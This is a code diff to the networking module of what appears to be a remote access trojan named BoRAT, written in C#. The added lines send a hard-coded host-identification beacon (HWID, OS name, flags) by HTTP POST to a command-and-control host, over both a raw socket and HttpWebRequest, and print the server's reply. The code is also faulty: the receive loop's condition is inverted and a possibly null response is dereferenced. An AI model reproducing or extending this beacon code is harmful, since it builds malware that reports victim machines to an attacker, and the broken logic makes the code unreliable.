@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 
@@ -17,11 +19,13 @@ namespace BoRAT.Core.Network
             {
                 try
                 {
+                    string data = "HWID|1|barbados|Windows 7|32&1&1";
                     // Send
-                    string request = "POST / HTTP/1.1\r\n" +
+                    string request = 
+                        "POST / HTTP/1.1\r\n" +
                         "Host: " + host + "\r\n" +
-                        "Content-Length: 0\r\n\r\n" +
-                        "HWID|1|barbados|Windows 7|32&1&1";
+                        "Content-Length: " + data.Length + "\r\n\r\n" + 
+                        data;
 
                     byte[] bytes = Encoding.ASCII.GetBytes(request);
                     socket.Send(bytes, bytes.Length, SocketFlags.None);
@@ -34,7 +38,7 @@ namespace BoRAT.Core.Network
                     {
                         countBytes = socket.Receive(rec, rec.Length, SocketFlags.None);
                         response += Encoding.ASCII.GetString(rec, 0, countBytes);
-                    } while (countBytes > 0);
+                    } while (countBytes <= 0);
 
                     socket.Close();
 
@@ -47,6 +51,36 @@ namespace BoRAT.Core.Network
                 }
             }
 
+        }
+
+        public static void Request(string lol)
+        {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(host);
+            request.Method = "POST";
+            string requestStr = "HWID|1|barbados|Windows 7|32&1&1";
+            request.ContentLength = requestStr.Length;
+            Stream postStream = request.GetRequestStream();
+            byte[] bytes = Encoding.ASCII.GetBytes(requestStr);
+            postStream.Write(bytes, 0, bytes.Length);
+            HttpWebResponse response = null;
+            try
+            {
+                response = (HttpWebResponse)request.GetResponse();
+            }catch(Exception ex)
+            {
+                Console.Write(ex.Message);
+            }
+
+            Console.Write(response.StatusCode.ToString());
+
+            if (response.StatusCode == HttpStatusCode.OK)
+            {
+                Stream stream = response.GetResponseStream();
+                StreamReader reader = new StreamReader(stream);
+                Console.Write(reader.ReadToEnd());
+                reader.Close();
+                stream.Close();
+            }
         }
     }
 }
